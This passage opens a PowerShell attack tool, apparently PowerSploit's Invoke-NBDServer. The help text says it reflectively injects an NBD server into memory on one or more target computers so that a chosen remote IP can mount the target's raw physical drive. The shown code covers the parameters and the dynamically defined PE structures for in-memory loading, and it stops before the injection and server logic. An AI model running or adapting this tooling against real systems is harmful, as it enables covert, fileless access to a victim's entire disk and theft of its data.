function Invoke-NBDServer
{
<#
.SYNOPSIS

This script leverages a modified version of Jeff Bryner's NBDServer project 
and PowerSploit's Invoke-ReflectivePEInjection to load a NBD server into memory.
This allows a remote system to mount a drive on the target system.

Function: Invoke-NBDServer
Author: Joe Bialek, Twitter: @JosephBialek
NBDServer Author: BJeff Bryner (X)
License: GPL version 2.0 (http://www.vanheusden.com/license.txt)

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER ClientIP

Mandatory, client IP address to accept connections from.

.PARAMETER FileToServe

Optional, file to serve ( \\.\PHYSICALDRIVE0 for example).

.PARAMETER PartitionToServe

Optional, partition on disk to serve (0 if not specified)

.PARAMETER ListenPort

Optional, port to listen on (60000 by default).

.PARAMETER ConnectionLimit

Optional, exit after a certain number of connections.


.EXAMPLE

Start the NBD server, only allowing 192.168.52.100 to connect, and share out \\.\PHYSICALDRIVE0
Invoke-NBDServer -ClientIP 192.168.52.100 -FileToServe \\.\PHYSICALDRIVE0

.EXAMPLE

Start the NBD server, only allowing 192.168.52.100 to connect, share out \\.\PHYSICALDRIVE0 and only partition 1.
Invoke-NBDServer -ClientIP 192.168.52.100 -FileToServe \\.\PHYSICALDRIVE0 -PartitionToServe 1


.LINK
Github repo for NBDserver: https://github.com/jeffbryner/NBDServer
Github repo for Invoke-ReflectivePEInjection: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
#>

[CmdletBinding(DefaultParameterSetName="WebFile")]
Param(
    [Parameter(Position = 0)]
    [String[]]
    $ComputerName,

    [Parameter(Position = 1, Mandatory = $true)]
    [String]
    $ClientIP,

    [Parameter(Position = 2)]
    [String]
    $FileToServe = "\\.\PHYSICALDRIVE0",

    [Parameter(Position = 3)]
    [String]
    $PartitionToServe = "0",

    [Parameter(Position = 4)]
    [String]
    $ListenPort = "60000",

    [Parameter(Position = 5)]
    [String]
    $ConnectionLimit = "1"
    
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $PEBytes32,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FuncReturnType,
                
        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $ProcId,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ProcName,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ExeArgs
    )
    
    ###################################
    ##########  Win32 Stuff  ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############    ENUM    ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ###########    STRUCT    ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        
        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()   
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        
        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        #Struct LUID_AND_ATTRIBUTES
